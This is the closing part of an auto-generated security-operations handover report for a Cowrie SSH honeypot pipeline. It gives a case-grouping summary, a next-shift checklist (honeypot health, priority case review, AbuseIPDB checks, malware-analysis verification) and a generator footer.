| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 7 priority case(s) shown individually · 21 recon entry/entries in table (5 group(s) consolidating 21 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-15T22:23:09Z_
